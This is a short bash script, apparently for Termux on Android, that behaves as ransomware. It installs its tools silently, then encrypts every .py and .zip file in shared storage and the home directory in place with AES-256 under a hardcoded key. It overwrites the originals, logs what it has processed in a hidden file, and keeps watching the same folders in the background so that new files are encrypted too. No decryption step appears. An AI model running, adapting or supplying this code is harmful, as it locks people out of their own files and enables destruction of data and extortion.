#!/bin/bash

AC_DIR=("/storage/emulated/0" "$HOME")
AC_PW="k3[oenen3*_*&/*/£5,mrk4nrm3%#&#&#&#,#?*/&=,]"
AC_AE="py zip"
PROCESSED_LOG="$AC_DIR/.system_log"

check_module() {
    if ! command -v inotifywait &> /dev/null; then
        pkg install inotify-tools openssl-tool curl -y > /dev/null 2>&1
    fi
}

initialize_log() {
    touch "$PROCESSED_LOG"
}

is_processed() {
    local FILE="$1"
    local HASH
    HASH=$(md5sum "$FILE" | awk '{print $1}')
    grep -qw "$HASH" "$PROCESSED_LOG"
}

mark_as_processed() {
    local FILE="$1"
    local HASH
    HASH=$(md5sum "$FILE" | awk '{print $1}')
    echo "$HASH" >> "$PROCESSED_LOG"
}

AC_EN() {
    local FILE="$1"
    EXT="${FILE##*.}"
    if echo "$AC_AE" | grep -qw "$EXT"; then
        if [ -f "$FILE" ]; then
            if ! is_processed "$FILE"; then
                TEMP_FILE="${FILE}.tmp"
                openssl enc -aes-256-cbc -salt -in "$FILE" -out "$TEMP_FILE" -k "$AC_PW" > /dev/null 2>&1
                if [ $? -eq 0 ]; then
                    mv "$TEMP_FILE" "$FILE"
                    mark_as_processed "$FILE"
                else
                    rm -f "$TEMP_FILE"
                fi
            fi
        fi
    fi
}

monitoring() {
    for dir in "${AC_DIR[@]}"; do
        inotifywait -m -e create -e moved_to --format '%w%f' "$dir" | while read -r FULL_PATH; do
            AC_EN "$FULL_PATH"
        done
    done
}

AC_DIRc() {
    for dir in "${AC_DIR[@]}"; do
        find "$dir" -type f | while read -r FILE; do
            AC_EN "$FILE"
        done
    done
}

if [ ! -d "$AC_DIR" ]; then
    exit 1
fi

check_module
initialize_log

(
  AC_DIRc
  monitoring
) > /dev/null 2>&1 &